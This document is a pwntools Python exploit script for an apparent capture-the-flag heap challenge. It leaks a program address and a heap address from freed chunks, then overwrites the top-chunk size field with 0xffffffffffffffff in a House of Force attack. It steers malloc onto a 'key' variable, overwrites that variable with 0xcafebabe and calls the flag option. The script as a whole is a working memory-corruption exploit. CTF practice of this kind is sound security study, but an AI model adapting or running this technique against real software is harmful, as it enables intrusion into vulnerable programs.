from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './chal_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context(terminal=['tmux', 'split-window', '-h'])
libc = ELF("./libc.so.6", checksec=False)

io = start()

def create(idx, payload, size):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'> ', str(idx).encode('utf-8'))
    io.sendlineafter(b'> ', str(size).encode('utf-8'))
    io.sendlineafter(b'> ', payload)

def view(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'> ', str(idx).encode('utf-8'))

def edit(idx, payload):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'> ', str(idx).encode('utf-8'))
    io.sendlineafter(b'> ', payload)

def remove(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'> ', str(idx).encode('utf-8'))

# Calculate key address
io.recvuntil(b'gift: ')
mainleak = int(io.recvline()[:-1], 16)
key = mainleak + 0x200eb2
log.success("key %#x", key)

# Leak heap address
create(0, b'AAAA', 10)
create(1, b'BBBB', 10)
remove(0)
remove(1)
view(1)

# Calculate top chunk location
heapleak = u64((io.recvuntil(b'Choose')[:6].ljust(8, b'\x00')))
log.success("heap leak %#x", heapleak)
top_chunk = heapleak + 0x30 
log.success("top chunk %#x", top_chunk)

# Overflow top chunk size field
create(2, b'AAAA', 10)
edit(2, b'A' * 24 + p64(0xffffffffffffffff))

offset = (key - 0x30) - (top_chunk)
log.info("Offset for next malloc %#x\n", offset)

# Malloc to place the top chunk near the key address
create(3, b'', offset)

# Change key value
create(4, b'A' * 12 + p64(0xcafebabe), 40)

# Get flag
io.sendlineafter(b'> ', b'5')
io.interactive()